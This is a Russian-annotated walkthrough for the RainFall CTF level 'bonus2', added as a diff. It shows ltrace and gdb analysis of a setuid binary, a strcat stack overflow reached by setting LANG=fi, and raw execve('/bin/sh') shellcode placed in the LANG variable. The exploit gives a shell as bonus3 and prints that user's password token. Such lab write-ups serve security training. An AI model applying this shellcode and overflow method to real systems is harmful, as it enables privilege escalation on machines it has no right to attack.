@@ -1,0 +1,176 @@
+bonus2@RainFall:~$ ls -la
+total 17
+dr-xr-x---+ 1 bonus2 bonus2   80 Mar  6  2016 .
+dr-x--x--x  1 root   root    340 Sep 23  2015 ..
+-rw-r--r--  1 bonus2 bonus2  220 Apr  3  2012 .bash_logout
+-rw-r--r--  1 bonus2 bonus2 3530 Sep 23  2015 .bashrc
+-rwsr-s---+ 1 bonus3 users  5664 Mar  6  2016 bonus2
+-rw-r--r--+ 1 bonus2 bonus2   65 Sep 23  2015 .pass
+-rw-r--r--  1 bonus2 bonus2  675 Apr  3  2012 .profile
+bonus2@RainFall:~$ ./bonus2
+bonus2@RainFall:~$ ./bonus2 123
+bonus2@RainFall:~$ ./bonus2 123 asd
+Hello 123
+bonus2@RainFall:~$ ltrace ./bonus2
+__libc_start_main(0x8048529, 1, 0xbffff7d4, 0x8048640, 0x80486b0 <unfinished ...>
++++ exited (status 1) +++
+bonus2@RainFall:~$ ltrace ./bonus2 asd
+__libc_start_main(0x8048529, 2, 0xbffff7d4, 0x8048640, 0x80486b0 <unfinished ...>
++++ exited (status 1) +++
+bonus2@RainFall:~$ ltrace ./bonus2 asd qwe
+__libc_start_main(0x8048529, 3, 0xbffff7d4, 0x8048640, 0x80486b0 <unfinished ...>
+strncpy(0xbffff6d0, "asd", 40)                                          = 0xbffff6d0
+strncpy(0xbffff6f8, "qwe", 32)                                          = 0xbffff6f8
+getenv("LANG")                                                          = "en_US.UTF-8"
+memcmp(0xbffffeff, 0x804873d, 2, 0xb7fff918, 0)                         = -1
+memcmp(0xbffffeff, 0x8048740, 2, 0xb7fff918, 0)                         = -1
+strcat("Hello ", "asd")                                                 = "Hello asd"
+puts("Hello asd"Hello asd
+)                                                       = 10
++++ exited (status 10) +++
+
+Программа использует два аргумента, оба их склеивает в один буфер и при этом не устанавливает
+завершающих символов, можно ли буфер переполнить
+./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 32')
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Segmentation fault (core dumped)
+
+Так же зачем-то подается переменная LANG, в которой хранится язык вывода
+Дальше производится сравнение каких-то строк, нужно определить значения.
+И в конце производиться конкатенация строк при помощи strcat, которая может
+нам помочь переписать значение EIP
+
+Идём всё смотреть через gdb
+(gdb) i func
+0x08048484  greetuser
+0x08048529  main
+(gdb) i var
+0x08049988  language
+
+(gdb) disas main
+0x080485c4 <+155>:	movl   $0x804873d,0x4(%esp)
+0x080485f3 <+202>:	movl   $0x8048740,0x4(%esp)
+
+(gdb) b * 0x080485c4
+(gdb) b * 0x080485f3
+
+(gdb) r asd qwe
+Breakpoint 1, 0x080485c4 in main ()
+(gdb) x/s 0x804873d
+0x804873d:	 "fi"
+Breakpoint 2, 0x080485f3 in main ()
+(gdb) x/s 0x8048740
+0x804873d:	 "nl"
+
+Смотрим дальше, где именно используется strcat
+(gdb) disas greetuser
+Dump of assembler code for function greetuser:
+   0x08048484 <+0>:	push   %ebp
+   0x08048485 <+1>:	mov    %esp,%ebp
+   0x08048487 <+3>:	sub    $0x58,%esp
+   0x0804848a <+6>:	mov    0x8049988,%eax
+   0x0804848f <+11>:	cmp    $0x1,%eax
+   0x08048492 <+14>:	je     0x80484ba <greetuser+54>
+   0x08048494 <+16>:	cmp    $0x2,%eax
+   0x08048497 <+19>:	je     0x80484e9 <greetuser+101>
+   0x08048499 <+21>:	test   %eax,%eax
+   0x0804849b <+23>:	jne    0x804850a <greetuser+134>
+   0x0804849d <+25>:	mov    $0x8048710,%edx
+   0x080484a2 <+30>:	lea    -0x48(%ebp),%eax
+   0x080484a5 <+33>:	mov    (%edx),%ecx
+   0x080484a7 <+35>:	mov    %ecx,(%eax)
+   0x080484a9 <+37>:	movzwl 0x4(%edx),%ecx
+   0x080484ad <+41>:	mov    %cx,0x4(%eax)
+   0x080484b1 <+45>:	movzbl 0x6(%edx),%edx
+   0x080484b5 <+49>:	mov    %dl,0x6(%eax)
+   0x080484b8 <+52>:	jmp    0x804850a <greetuser+134>
+   0x080484ba <+54>:	mov    $0x8048717,%edx
+   0x080484bf <+59>:	lea    -0x48(%ebp),%eax
+   0x080484c2 <+62>:	mov    (%edx),%ecx
+   0x080484c4 <+64>:	mov    %ecx,(%eax)
+   0x080484c6 <+66>:	mov    0x4(%edx),%ecx
+   0x080484c9 <+69>:	mov    %ecx,0x4(%eax)
+   0x080484cc <+72>:	mov    0x8(%edx),%ecx
+   0x080484cf <+75>:	mov    %ecx,0x8(%eax)
+   0x080484d2 <+78>:	mov    0xc(%edx),%ecx
+   0x080484d5 <+81>:	mov    %ecx,0xc(%eax)
+   0x080484d8 <+84>:	movzwl 0x10(%edx),%ecx
+   0x080484dc <+88>:	mov    %cx,0x10(%eax)
+   0x080484e0 <+92>:	movzbl 0x12(%edx),%edx
+   0x080484e4 <+96>:	mov    %dl,0x12(%eax)
+   0x080484e7 <+99>:	jmp    0x804850a <greetuser+134>
+   0x080484e9 <+101>:	mov    $0x804872a,%edx
+   0x080484ee <+106>:	lea    -0x48(%ebp),%eax
+   0x080484f1 <+109>:	mov    (%edx),%ecx
+   0x080484f3 <+111>:	mov    %ecx,(%eax)
+   0x080484f5 <+113>:	mov    0x4(%edx),%ecx
+   0x080484f8 <+116>:	mov    %ecx,0x4(%eax)
+   0x080484fb <+119>:	mov    0x8(%edx),%ecx
+   0x080484fe <+122>:	mov    %ecx,0x8(%eax)
+   0x08048501 <+125>:	movzwl 0xc(%edx),%edx
+   0x08048505 <+129>:	mov    %dx,0xc(%eax)
+   0x08048509 <+133>:	nop
+   0x0804850a <+134>:	lea    0x8(%ebp),%eax
+   0x0804850d <+137>:	mov    %eax,0x4(%esp)
+   0x08048511 <+141>:	lea    -0x48(%ebp),%eax
+   0x08048514 <+144>:	mov    %eax,(%esp)
+   0x08048517 <+147>:	call   0x8048370 <strcat@plt>
+   0x0804851c <+152>:	lea    -0x48(%ebp),%eax
+   0x0804851f <+155>:	mov    %eax,(%esp)
+   0x08048522 <+158>:	call   0x8048390 <puts@plt>
+   0x08048527 <+163>:	leave
+   0x08048528 <+164>:	ret
+End of assembler dump.
+
+Так теперь нам нужно узнать смещение для перезаписи EIP
+Подаём строку паттерн для определения смещения
+./bonus2 $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+
+(gdb) r $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08006241 in ?? ()
+
+Видим по адресу, что мы так и не дошли до EIP, так как буфер не получается таким большим из-за суммарной длины
+строки 72 + приветствиеИ следовательно мы не перезаписываем EIP
+Хорошо, возможно это связано с языком, давайте поменяем, не зря же переменная окружения задействована
+
+bonus2@RainFall:~$ export LANG=fi
+(gdb) r $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41366141 in ?? ()
+
+Смещение равно 18 - это на финском
+Теперь вопрос где нам хранить наш шеллкод и откуда его вызывать.
+У нас есть переменная LANG, в неё можно и закинуть
+export LANG=$(python -c 'print("fi" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
+
+(gdb) b *0x080485a6
+(gdb) run $(python -c 'print "A"*40') bla
+Breakpoint 1, 0x080485a6 in main ()
+(gdb) x/20s *((char**)environ)
+...
+0xbffffeb3:	 "LANG=fi"
+...
+
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\xb3\xfe\xff\xbf"')
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB翿¿
+$ asd
+sh: 1: asd: not found
+$ whoami
+bonus3
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+
+
+
+
+
+
+
+
